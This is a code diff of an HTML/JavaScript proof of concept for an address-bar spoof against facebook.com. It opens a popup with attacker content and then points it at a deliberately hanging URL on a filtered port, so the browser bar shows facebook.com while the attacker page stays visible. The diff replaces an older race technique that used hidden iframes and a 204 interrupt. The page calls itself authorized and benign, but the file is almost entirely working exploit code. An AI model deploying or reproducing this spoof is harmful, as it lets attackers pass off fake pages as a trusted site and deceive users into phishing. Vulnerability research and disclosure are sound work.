@@ -13,6 +13,8 @@
 </head>
 <body>
  <p>Authorized benign PoC — navigation-race / optimistic-URL spoof. Tap the link:</p>
+ <p style="font-size:12px;color:#666">hang target (koneksi tak pernah commit → konten attacker nyangkut):</p>
+ <input id="hang" value="https://m.facebook.com:8443/" style="width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0">
  <a id="test" href="https://web.facebook.com/" onclick="foo();return false;">https://web.facebook.com/</a>
  <pre id="log">log:</pre>
  <p class="warn">Benign: NO credentials are read or stored. Proof = attacker page shown while bar shows facebook.com.</p>
@@ -59,48 +61,34 @@ footer{text-align:center;margin-top:40px;font-size:14px;color:#8a8d91}</style></
 <\/script></body></html>`;
  }
 
+ function hangUrl(){ var v=document.getElementById('hang'); return (v&&v.value||'https://m.facebook.com:8443/').trim(); }
+ var navigated=false;
+
  function foo(){
+   navigated=false;
    document.getElementById("test").href = "#";
    w = window.open("?fake");
    if(!w){ log('popup blocked — FB/IG may block window.open'); return; }
-   log('opened child ?fake (attacker content). polling…');
-   t = setInterval(bar, 1);
+   log('opened child ?fake. waiting for attacker content…');
+   t = setInterval(step, 50);
  }
 
- function bar(){
+ function step(){
    try{
-     if (w.location.href !== "about:blank") {
-       log('child left about:blank -> navigating child to REAL facebook (bar should show facebook)');
-       document.body.innerHTML = "<h1>Redirecting…</h1>";
-       slow();
-       w.location.href = "https://www.google.com/csi";
+     // same-origin while child is on ?fake; readable until we navigate away
+     if (!navigated && w.location.href.indexOf('about:blank') === -1){
+       navigated = true;
        clearInterval(t);
-       z = setInterval(baz, 1);
+       var u = hangUrl();
+       log('attacker content up. navigating child to HANGING target: ' + u);
+       // never commits (filtered port) -> old attacker document stays painted,
+       // bar optimistically shows the target URL. No 5s decay.
+       w.location.href = u;
+       log('DONE. Child: bar should show facebook & attacker content should PERSIST.');
      }
-   }catch(e){ clearInterval(t); }
- }
-
- function baz(){
-   try{
-     // reading cross-origin href throws once child committed to facebook.com
-     var _ = w.location.href;
-     void _;
    }catch(e){
-     // child now cross-origin (bar = facebook). Interrupt load with a 204 beacon
-     // so the committed URL stays while attacker content (hopefully) remains.
-     try{ w.location.href = "https://web.facebook.com/"; }catch(_){}
-     clearInterval(z);
-     log('interrupted with 204 (google.com/csi). CHECK child: does bar show web.facebook.com while content = BENIGN SPOOF TEST?');
-   }
- }
-
- // slow the real facebook load so the race window is wider
- function slow(){
-   for (i = 0; i < 10; i++){
-     iframe = document.createElement("iframe");
-     iframe.src = "https://web.facebook.com/";
-     iframe.style = "display:none";
-     document.body.appendChild(iframe);
+     clearInterval(t);
+     log('child became cross-origin (stopped polling)');
    }
  }
 </script>
